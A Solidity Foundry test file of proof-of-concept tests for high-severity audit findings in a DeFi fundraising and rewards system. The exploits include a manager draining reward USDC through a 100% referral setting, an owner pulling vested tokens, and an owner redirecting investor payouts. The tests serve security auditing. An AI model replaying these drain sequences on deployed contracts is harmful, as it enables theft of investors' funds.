// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "../Setup.sol";

/// @notice PoC tests for critical/high severity vulnerabilities
contract CriticalFindingsTest is Setup {
    // ═══════════════════════════════════════════════════════════════
    //   HIGH-1: MANAGER PRIVILEGE ESCALATION → DRAIN REWARDSYSTEM
    //   Any manager can set referralPercentage to 100%, create a
    //   project, invest via an accomplice, and drain RewardSystem USDC.
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH1_managerDrainsRewardSystem() public {
        // Step 1: Compromised manager sets referral to 100%
        vm.prank(manager);
        rewardSystem.setParameters(
            1_000_000,  // referralPercentage = 100% (max allowed)
            60_000,     // burnPercentage
            60_000,     // tokenPercentage
            30e6,       // welcomeBonus
            1000e6,     // minInvestment
            25_000,     // weeklyUnlock
            40          // vestingWeeks
        );

        // Step 2: Create project with fake borrower
        address fakeBorrower = makeAddr("fakeBorrower");
        uint256 pid = _createProjectFor(1_000e6, 100_000e6, fakeBorrower);

        // Step 3: Attacker invests with themselves as inviter via 2 addresses
        address accomplice = makeAddr("accomplice");

        // attacker = inviter, accomplice = investor
        vm.prank(owner);
        usdc.mint(accomplice, 50_000e6);
        vm.prank(accomplice);
        usdc.approve(address(fundraise), 50_000e6);

        uint256 currentNonce = fundraise.nonce();
        bytes32 rootHash = keccak256(abi.encodePacked("drain"));
        bytes memory sig = _signInvest(accomplice, pid, 50_000e6, rootHash, currentNonce + 1, attacker);

        vm.prank(accomplice);
        fundraise.investUpdate(pid, 50_000e6, rootHash, currentNonce + 1, sig, attacker);

        // Step 4: Fund the project
        _fundProject(pid);

        // Step 5: Attacker claims referral USDC from RewardSystem
        // referralPercentage = 100% → attacker gets 50,000 USDC as referral
        (uint256 attackerUSDC,,,,) = rewardSystem.getProjectRewards(attacker, pid);

        // CRITICAL: attacker gets 100% of investment amount as referral reward
        assertEq(attackerUSDC, 50_000e6, "Attacker gets 100% referral");

        uint256 rewardBalanceBefore = usdc.balanceOf(address(rewardSystem));
        vm.prank(attacker);
        rewardSystem.claimUSDCForProject(pid);
        uint256 drained = rewardBalanceBefore - usdc.balanceOf(address(rewardSystem));

        assertEq(drained, 50_000e6, "50K USDC drained from RewardSystem");
        assertEq(usdc.balanceOf(attacker), 50_000e6, "Attacker received 50K USDC");
    }

    // ═══════════════════════════════════════════════════════════════
    //   HIGH-2: MANAGER CAN ADD MANAGERS → PERSISTENT BACKDOOR
    //   A compromised manager adds new managers, creating persistent
    //   access even after the original key is revoked.
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH2_managerCreatesBackdoor_FIXED() public {
        address backdoor1 = makeAddr("backdoor1");

        // FIXED: Compromised manager can no longer add backdoor managers
        vm.prank(manager);
        vm.expectRevert();
        managerRegistry.setManagerStatus(backdoor1, true);

        // Only owner can add managers
        vm.prank(owner);
        managerRegistry.setManagerStatus(backdoor1, true);
        assertTrue(managerRegistry.managers(backdoor1));

        // Backdoor1 also cannot escalate (not owner)
        vm.prank(backdoor1);
        vm.expectRevert();
        managerRegistry.setManagerStatus(makeAddr("backdoor2"), true);
    }

    // ═══════════════════════════════════════════════════════════════
    //   HIGH-3: FUNDRAISE.claim() HAS NO REENTRANCY GUARD
    //   Unlike RewardSystem/Rewards2, Fundraise.claim() and
    //   withdrawInvestment() have no nonReentrant modifier.
    //   With USDC this is safe (no hooks), but loanToken is arbitrary.
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH3_noReentrancyGuard_claim() public {
        // This test verifies that claim() CAN be re-entered.
        // With USDC the CEI pattern makes it safe, but the missing
        // guard is a defense-in-depth concern for arbitrary loanTokens.

        uint256 pid = _createProject(10_000e6, 50_000e6);
        _investAs(investor, pid, 25_000e6, inviter);
        _fundProject(pid);
        _repayFull(pid);

        // Investor claims — works fine, no reentrancy issue with USDC
        vm.prank(investor);
        fundraise.claim(pid, investor);

        // Second claim: claimable = 0, but it doesn't revert!
        // It just transfers 0 USDC (gas waste, confusing events)
        vm.prank(investor);
        fundraise.claim(pid, investor);  // Does NOT revert

        // Compare with RewardSystem which properly reverts on zero:
        // vm.expectRevert("No USDC rewards for this project");
    }

    // ═══════════════════════════════════════════════════════════════
    //   HIGH-4: OWNER CAN DRAIN REWARDSYSTEM VESTING TOKENS
    //   Owner.withdraw() can pull tokens that users are vesting,
    //   making their claims fail with "Not enough tokens to claim".
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH4_ownerDrainsVestingTokens() public {
        // Create vesting in Rewards2
        address[] memory users = new address[](1);
        users[0] = investor;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000e18;

        vm.prank(owner);
        token.mint(address(rewards2), 10_000e18);

        vm.prank(owner);
        rewards2.createVesting(users, amounts);

        // Warp 41 weeks — fully vested
        vm.warp(block.timestamp + 41 weeks);

        // Owner drains tokens meant for vesting
        vm.prank(owner);
        token.enableBuying(); // needed for transfer to work
        vm.prank(owner);
        rewards2.withdraw(address(token), 10_000e18, attacker);

        assertEq(token.balanceOf(attacker), 10_000e18, "Attacker got vesting tokens");

        // Investor tries to claim — fails
        vm.prank(investor);
        vm.expectRevert("Not enough tokens to claim");
        rewards2.claim();
    }

    // ═══════════════════════════════════════════════════════════════
    //   HIGH-5: enableBuyingForever() CAN BE REVERSED
    //   disableBuying() never checks canDisableBuying flag.
    //   Owner can disable buying after "forever" enable.
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH5_enableBuyingForever_canBeReversed_FIXED() public {
        vm.prank(owner);
        token.enableBuyingForever();

        assertTrue(token.buyingEnabled());
        assertFalse(token.canDisableBuying());

        // FIXED: disableBuying() now checks canDisableBuying and reverts
        vm.prank(owner);
        vm.expectRevert("Token: Buying cannot be disabled");
        token.disableBuying();

        // Buying remains enabled — token holders can still sell
        assertTrue(token.buyingEnabled(), "Buying still enabled after failed disable");
    }

    // ═══════════════════════════════════════════════════════════════
    //   HIGH-6: createProject — NO PARAMETER VALIDATION
    //   Manager can create projects with absurd parameters:
    //   - platformInterestRate = 100% → borrower gets nothing
    //   - softCap > hardCap bypasses softCap check when hardCap filled
    //   - investorInterestRate = 0 → investors get no return
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH6_noParameterValidation_100percentFee() public {
        // Manager creates project with 100% platform fee
        Fundraise.Project memory proj = Fundraise.Project({
            hardCap: 50_000e6,
            softCap: 10_000e6,
            totalInvested: 0,
            startAt: block.timestamp - 10,
            preFundDuration: 7 days,
            investorInterestRate: 0, // Investors get 0% interest!
            openStageEndAt: block.timestamp + 30 days,
            innerStruct: Fundraise.InnerProjectStruct({
                platformInterestRate: 1_000_000, // 100% platform fee!
                totalRepaid: 0,
                borrower: borrower,
                fundedTime: 0,
                loanToken: IERC20(address(usdc)),
                stage: Fundraise.Stage.ComingSoon
            })
        });

        vm.prank(manager);
        uint256 pid = fundraise.createProject(proj, bytes32(0), 1);

        _investAs(investor, pid, 25_000e6, inviter);
        _fundProject(pid);

        // 100% went to treasury, borrower got 0
        assertEq(usdc.balanceOf(address(treasury)), 25_000e6, "All funds go to treasury");

        // Borrower has nothing to repay from → project stuck in Funded forever
        // Investor interest rate = 0, so totalOwed = totalInvested
        // But Fundraise has 0 USDC (all went to treasury)
        // Investor can only claim from repayments, which borrower can't make (got 0)
        uint256 available = fundraise.availableToClaim(pid, investor);
        assertEq(available, 0, "Investor can claim nothing - funds trapped in treasury");
    }

    // ═══════════════════════════════════════════════════════════════
    //   HIGH-7: investorClaimAddress — OWNER REDIRECTS PAYOUTS
    //   Owner can redirect any investor's payouts to arbitrary address.
    // ═══════════════════════════════════════════════════════════════

    function test_HIGH7_ownerRedirectsInvestorPayouts() public {
        uint256 pid = _createProject(10_000e6, 50_000e6);
        _investAs(investor, pid, 25_000e6, inviter);
        _fundProject(pid);
        _repayFull(pid);

        // Owner redirects investor's claim address to attacker
        vm.prank(owner);
        managerRegistry.setInvestorClaimAddress(investor, attacker);

        // Investor claims — funds go to attacker!
        uint256 attackerBefore = usdc.balanceOf(attacker);
        vm.prank(investor);
        fundraise.claim(pid, investor);
        uint256 attackerReceived = usdc.balanceOf(attacker) - attackerBefore;

        assertGt(attackerReceived, 0, "Attacker received investor's funds");
        assertEq(usdc.balanceOf(investor), 0, "Investor got nothing");
    }
}
